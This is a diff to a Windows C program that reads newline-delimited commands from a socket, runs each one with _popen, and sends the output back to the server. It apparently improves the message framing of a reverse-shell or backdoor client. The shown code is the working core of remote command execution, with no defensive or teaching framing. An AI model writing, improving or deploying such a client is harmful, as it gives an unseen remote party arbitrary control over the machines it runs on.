@@ -36,28 +36,48 @@ int main() {
     return 1;
   }
 
+
+  char recv_buffer[1024];
+  int recv_len = 0;
+
   while (1) {
     char cmd[1024];
-    int total = 0;
+    char *newline;
 
+    // Processes one command per loop iteration
     while (1) {
-      int n = recv(sock, cmd + total, sizeof(cmd) - 1 - total, 0);
+      // Receive bytes from socket and append them to recv_buffer
+      int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
 
       if (n > 0) {
-        total += n;
+        recv_len += n;
         
-        if (memchr(cmd, '\n', total)) {
+        // Check for delimiter `\n` to frame messages
+        newline = memchr(recv_buffer, '\n', recv_len);
+
+        if (newline) {
           break;
         }
+        
       }
     }
 
-    cmd[total] = '\0';
+    int cmd_len = newline - recv_buffer;
+
+    // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
+    memcpy(cmd, recv_buffer, cmd_len);
+    // Append `\0` to make it a string
+    cmd[cmd_len] = '\0';
+
     printf("Received from server: %s", cmd);
+
+    // Move remaining bytes back to the start of recv_buffer
+    memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - cmd_len);
+    recv_len = recv_len - (cmd_len + 1);
     
 
-    
 
+    // Perform received command
     FILE *fp = _popen(cmd, "r");
 
     char output[4096];
@@ -65,6 +85,8 @@ int main() {
 
     output[len] = '\0';
     _pclose(fp);
+
+    printf("OUTPUT: %s", output);
 
     send(sock, output, strlen(output), 0);
   }
